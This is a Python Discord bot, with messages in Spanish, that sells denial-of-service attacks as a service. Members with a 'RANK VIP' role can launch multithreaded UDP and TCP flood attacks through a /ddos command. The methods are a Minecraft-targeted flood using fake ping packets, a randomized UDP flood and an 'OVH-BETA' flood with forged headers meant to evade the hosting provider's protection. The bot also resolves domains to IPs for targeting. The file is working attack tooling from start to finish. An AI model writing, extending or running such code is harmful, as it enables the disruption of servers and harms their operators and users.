
import discord
from discord import app_commands
import socket
import threading
import time
import random

DISCORD_TOKEN = "TU_TOKEN"
VIP_ROLE_NAME = "RANK VIP"
THREADS = 100

active_attacks = []

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

def udp_flood(ip, port, duration, control_flag):
    timeout = time.time() + duration
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            size = random.randint(512, 65500)
            payload = random._urandom(size)
            dynamic_port = port + random.randint(-5, 5)
            sock.sendto(payload, (ip, dynamic_port))
        except:
            pass

def tcp_flood_minecraft(ip, port, duration, control_flag):
    timeout = time.time() + duration
    fake_packet = b'\x00\x00\x04\x4d\x43\x50\x49\x4e\x47'
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.sendall(fake_packet)
            time.sleep(0.01)
            sock.close()
        except:
            pass

def attack_mc(ip, port, duration, control_flag):
    def udp_thread():
        udp_flood(ip, port, duration, control_flag)
    def tcp_thread():
        tcp_flood_minecraft(ip, port, duration, control_flag)

    for _ in range(THREADS // 2):
        t1 = threading.Thread(target=udp_thread)
        t2 = threading.Thread(target=tcp_thread)
        t1.start()
        t2.start()
        active_attacks.append((t1, control_flag))
        active_attacks.append((t2, control_flag))

def udp_mix(ip, port, duration, control_flag):
    timeout = time.time() + duration
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(random.randint(1024, 65500))
            dynamic_port = port + random.randint(-10, 10)
            sock.sendto(payload, (ip, dynamic_port))
        except:
            pass

def ovh_beta(ip, port, duration, control_flag):
    timeout = time.time() + duration
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fake_header = b"\x08\x00" + random._urandom(10)
            payload = fake_header + random._urandom(random.randint(600, 1200))
            sock.sendto(payload, (ip, port + random.randint(-20, 20)))
        except:
            pass

@tree.command(name="ddos", description="Inicia un ataque L4 potente")
@app_commands.describe(
    method="Método: MC, UDP-MIX o OVH-BETA",
    ip="IP del objetivo",
    port="Puerto",
    time="Tiempo en segundos"
)
async def ddos(interaction: discord.Interaction, method: str, ip: str, port: int, time: int):
    user_roles = [role.name for role in interaction.user.roles]
    if VIP_ROLE_NAME not in user_roles:
        await interaction.response.send_message("No tienes el rol RANK VIP.", ephemeral=True)
        return

    if method.upper() not in ["MC", "UDP-MIX", "OVH-BETA"]:
        await interaction.response.send_message("Método inválido. Usa /methods.", ephemeral=True)
        return

    await interaction.response.send_message(
        f"**TYPE: L4**\n"
        f"IP: `{ip}`\n"
        f"PORT: `{port}`\n"
        f"TIME: `{time}` segundos\n"
        f"METHOD: `{method.upper()}`\n"
        f"Status: **Enviando ataque...**"
    )

    control_flag = {'run': True}

    def run():
        if method.upper() == "MC":
            attack_mc(ip, port, time, control_flag)
        elif method.upper() == "UDP-MIX":
            for _ in range(THREADS):
                t = threading.Thread(target=udp_mix, args=(ip, port, time, control_flag))
                t.start()
                active_attacks.append((t, control_flag))
        elif method.upper() == "OVH-BETA":
            for _ in range(THREADS):
                t = threading.Thread(target=ovh_beta, args=(ip, port, time, control_flag))
                t.start()
                active_attacks.append((t, control_flag))

    threading.Thread(target=run).start()

@tree.command(name="stop", description="Detiene todos los ataques activos")
async def stop_attack(interaction: discord.Interaction):
    for t, flag in active_attacks:
        flag['run'] = False
    active_attacks.clear()
    await interaction.response.send_message("Todos los ataques han sido detenidos.")

@tree.command(name="methods", description="Ver métodos disponibles")
async def methods(interaction: discord.Interaction):
    await interaction.response.send_message("**Métodos disponibles:**\n`MC` (Minecraft)\n`UDP-MIX`\n`OVH-BETA`")

@tree.command(name="ip", description="Resuelve un dominio a IP")
@app_commands.describe(host="Dominio (ej: play.example.com)")
async def ip_lookup(interaction: discord.Interaction, host: str):
    try:
        resolved = socket.gethostbyname(host)
        await interaction.response.send_message(f"`{host}` → `{resolved}`")
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}", ephemeral=True)

@bot.event
async def on_ready():
    await tree.sync()
    print(f"Bot conectado como {bot.user}")

bot.run(DISCORD_TOKEN)
